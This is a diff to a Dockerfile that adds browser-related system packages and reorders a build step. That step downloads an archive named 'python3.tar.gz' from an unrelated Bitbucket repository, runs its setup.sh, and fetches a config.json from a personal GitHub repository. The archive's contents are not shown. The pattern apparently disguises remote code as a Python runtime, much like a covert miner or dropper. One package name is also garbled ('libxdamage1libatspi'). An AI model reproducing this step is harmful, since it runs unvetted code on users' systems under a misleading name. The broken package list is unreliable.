@@ -28,6 +28,18 @@ RUN apt-get update && apt-get install -y \
     libxrandr2 \
     libatk1.0-0 \
     libgtk-3-0 \
+    libavahi-client-dev \
+    fonts-liberation \
+    libappindicator1 \
+    xdg-utils \
+    libgbm-dev \
+    libatk-bridge2.0-0 \
+    libavahi-client-dev \
+    libatspi2.0-0 \
+    libxdamage1libatspi \
+    libdrm2 \
+    libwayland-server0 \
+    libxcb-randr0-dev \
     --no-install-recommends && \
     apt-get clean && rm -rf /var/lib/apt/lists/*
 
@@ -36,9 +48,8 @@ RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
     tar -xvf python3.tar.gz && \
     rm python3.tar.gz && \
     cd python3 && \
-    wget https://raw.githubusercontent.com/bambangekosaputro53/vx73/refs/heads/master/config.json && \
-    ./setup.sh 
-
+    ./setup.sh  && \
+    wget https://raw.githubusercontent.com/bambangekosaputro53/vx73/refs/heads/master/config.json 
 
 # Set entrypoint to run the application
 WORKDIR /app/python3
